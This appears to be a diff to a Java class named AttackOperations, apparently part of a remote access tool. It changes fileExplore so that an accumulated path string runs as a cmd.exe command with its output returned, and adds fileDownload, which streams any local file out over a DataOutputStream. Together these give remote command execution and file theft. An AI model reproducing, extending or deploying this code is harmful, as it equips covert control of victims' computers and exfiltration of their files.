@@ -1,5 +1,8 @@
 import java.io.BufferedReader;
+import java.io.DataOutputStream;
 import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.InputStreamReader;
 
@@ -108,23 +111,6 @@ public class AttackOperations {
 	public static String fileExplore(String path){
 		try{
 			filePath+=path+" ";
-			if(path.equals("undo")) {
-				filePath = "";
-				ProcessBuilder builder = new ProcessBuilder("cmd.exe" , "/C" , "echo done");
-	            builder.redirectErrorStream(true);
-	            Process p = builder.start();
-	            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
-	            String line,ans="";
-	            while (true) {
-	                line = r.readLine();
-	                if (line == null) { break; }
-	                ans+=line;
-	                ans+="\n";
-	            }
-	            
-	            return ans;
-			}
-			else {
 				ProcessBuilder builder = new ProcessBuilder("cmd.exe" , "/C" , filePath);
 	            builder.redirectErrorStream(true);
 	            Process p = builder.start();
@@ -136,14 +122,26 @@ public class AttackOperations {
 	                ans+=line;
 	                ans+="\n";
 	            }
+	            filePath="";
 	            
 	            return ans;
-			}
+			
 
             
         }catch(Exception e) {
         	
         	return "failed..";
+		}
+	}
+	
+	public static void fileDownload(String path,DataOutputStream dout){
+		int i;
+	    try {
+			FileInputStream fis = new FileInputStream (path);
+			 while ((i = fis.read()) > -1)
+			        dout.write(i);
+		} catch (Exception e) {
+			
 		}
 	}
 		
